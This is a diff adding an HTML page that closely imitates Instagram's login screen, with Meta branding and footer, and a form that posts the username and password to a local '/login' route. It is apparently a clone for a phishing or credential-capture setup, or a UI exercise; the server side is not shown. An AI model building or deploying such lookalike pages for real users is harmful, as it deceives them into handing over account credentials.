@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white">
+<div class="flex justify-center mt-3 min-h-screen">
+  <div class="w-full max-w-sm">
+    <div class="bg-white sm:border sm:border-gray-300 p-8">
+      <div class="flex justify-center mb-6">
+        <img src="image.png" alt="Instagram" width="200px" class="mb-6 mt-6">
+      </div>
+      <form action="/login" method="POST" class="space-y-3">
+        <input 
+          type="text" 
+          name="username" 
+          id="username"
+          placeholder="Phone number, username, or email" 
+          class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm bg-gray-50 focus:outline-none focus:ring-1 focus:ring-gray-400"
+        />
+        <div class="relative">
+          <input 
+            type="password" 
+            name="password" 
+            id="password"
+            placeholder="Password" 
+            class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm bg-gray-50 focus:outline-none focus:ring-1 focus:ring-gray-400 pr-16"
+          />
+          <button type="button" id="togglePassword" class="absolute right-2 top-1/2 transform -translate-y-1/2 text-xs text-gray-600 font-semibold focus:outline-none">Show</button>
+        </div>
+        <button 
+          type="submit" 
+          id="loginBtn"
+          class="w-full bg-blue-500 hover:bg-blue-600 text-white py-1.5 rounded-lg text-sm font-semibold"
+          disabled
+        >
+          Log in
+        </button>
+      </form>
+
+      <div class="flex items-center my-3">
+        <div class="flex-grow h-px bg-gray-300"></div>
+        <span class="px-2 text-sm text-gray-500 font-semibold">OR</span>
+        <div class="flex-grow h-px bg-gray-300"></div>
+      </div>
+
+      <div class="flex justify-center mb-3">
+        <button class="flex items-center text-blue-800 text-sm font-semibold">
+          <img width="30px" src="f-icon.png" alt="">
+          Log in with Facebook
+        </button>
+      </div>
+
+      <div class="text-center">
+        <a href="#" class="text-xs text-black-900" style="font-weight: bold; font-size: 12px;">Forgot password?</a>
+      </div>
+    </div>
+
+    <div class="bg-white sm:border sm:border-gray-300 p-4 text-center mt-3">
+      <span class="text-sm">Don't have an account? <a href="#" class="text-blue-500 font-semibold">Sign up</a></span>
+    </div>
+
+    <div class="mt-3 text-center">
+      <span class="text-sm">Get the app.</span>
+      <div class="flex justify-center mt-2 space-x-2">
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" class="h-10">
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Get it from Microsoft" class="h-10">
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer style="margin-top: -70px;" class="text-center mb-8 text-xs text-gray-500">
+  <div class="flex flex-wrap justify-center gap-2 md:gap-4">
+    <a href="#" class="hover:underline">Meta</a>
+    <a href="#" class="hover:underline">About</a>
+    <a href="#" class="hover:underline">Blog</a>
+    <a href="#" class="hover:underline">Jobs</a>
+    <a href="#" class="hover:underline">Help</a>
+    <a href="#" class="hover:underline">API</a>
+    <a href="#" class="hover:underline">Privacy</a>
+    <a href="#" class="hover:underline">Terms</a>
+    <a href="#" class="hover:underline">Locations</a>
+    <a href="#" class="hover:underline">Instagram Lite</a>
+    <a href="#" class="hover:underline">Threads</a>
+    <a href="#" class="hover:underline">Contact Uploading & Non-Users</a>
+    <a href="#" class="hover:underline">Meta Verified</a>
+  </div>
+  <div class="mt-2">
+    English <span class="inline-block align-middle">▼</span> &copy; 2025 Instagram from Meta
+  </div>
+</footer>
+
+<script>
+  const usernameInput = document.getElementById('username');
+  const passwordInput = document.getElementById('password');
+  const loginBtn = document.getElementById('loginBtn');
+  const togglePassword = document.getElementById('togglePassword');
+
+  function checkInputs() {
+    if (usernameInput.value.trim() && passwordInput.value.trim()) {
+      loginBtn.disabled = false;
+    } else {
+      loginBtn.disabled = true;
+    }
+  }
+
+  usernameInput.addEventListener('input', checkInputs);
+  passwordInput.addEventListener('input', checkInputs);
+
+  togglePassword.addEventListener('click', function () {
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+      togglePassword.textContent = 'Hide';
+    } else {
+      passwordInput.type = 'password';
+      togglePassword.textContent = 'Show';
+    }
+  });
+</script>
+
+</body>
+</html>
